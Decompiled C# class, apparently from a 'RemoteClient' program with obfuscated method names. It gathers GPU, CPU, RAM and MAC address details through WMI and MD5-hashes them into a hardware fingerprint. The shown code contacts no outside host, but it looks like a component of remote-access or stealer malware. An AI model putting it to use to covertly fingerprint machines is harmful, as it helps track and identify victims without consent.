using System;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using RemoteClient.Polices;

namespace RemoteClient.Tasks
{
	// Token: 0x02000029 RID: 41
	internal class ProcessListenerTask
	{
		// Token: 0x060000BA RID: 186 RVA: 0x000057D8 File Offset: 0x000039D8
		public static string ViewMapper()
		{
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				string str = text;
				object obj = managementObject["VideoProcessor"];
				text = str + ((obj != null) ? obj.ToString() : null) + " | ";
				string str2 = text;
				object obj2 = managementObject["AdapterRAM"];
				text = str2 + ((obj2 != null) ? obj2.ToString() : null) + "\n";
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
			{
				ManagementObject managementObject2 = (ManagementObject)managementBaseObject2;
				string str3 = text;
				object obj3 = managementObject2["Name"];
				text = str3 + ((obj3 != null) ? obj3.ToString() : null) + " | ";
				string str4 = text;
				object obj4 = managementObject2["NumberOfCores"];
				text = str4 + ((obj4 != null) ? obj4.ToString() : null) + "\n";
			}
			foreach (ManagementBaseObject managementBaseObject3 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory").Get())
			{
				ManagementObject managementObject3 = (ManagementObject)managementBaseObject3;
				text += string.Format("{0} ; {1} Mb; {2} \n", managementObject3["BankLabel"], Math.Round(Convert.ToDouble(managementObject3["Capacity"]) / 1024.0 / 1024.0, 2), managementObject3["Speed"]);
			}
			return text + ProcessListenerTask.WriteMapper();
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000059C8 File Offset: 0x00003BC8
		public static string ReflectMapper()
		{
			string text = "";
			string text2 = ProcessListenerTask.ViewMapper();
			char[] separator = new char[]
			{
				'\n'
			};
			foreach (string setup in text2.Split(separator))
			{
				string text3 = ProcessListenerTask.InsertMapper(setup);
				text += text3.Substring(0, text3.Length - 16);
			}
			return text;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00005A34 File Offset: 0x00003C34
		public static string InsertMapper(string setup)
		{
			byte[] array = new MD5CryptoServiceProvider().ComputeHash(Encoding.Unicode.GetBytes(setup));
			string text = string.Empty;
			foreach (byte b in array)
			{
				text += string.Format("{0:x2}", b);
			}
			return text;
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00005A90 File Offset: 0x00003C90
		public static string WriteMapper()
		{
			string result;
			try
			{
				string text = "";
				foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
				{
					if (networkInterface.OperationalStatus == OperationalStatus.Up && !networkInterface.Description.Contains("Virtual") && !networkInterface.Description.Contains("Pseudo") && networkInterface.GetPhysicalAddress().ToString() != "")
					{
						text = networkInterface.GetPhysicalAddress().ToString();
					}
				}
				result = text;
			}
			catch (Exception ex)
			{
				ex.ToString();
				result = "";
			}
			return result;
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00002297 File Offset: 0x00000497
		public ProcessListenerTask()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}
	}
}
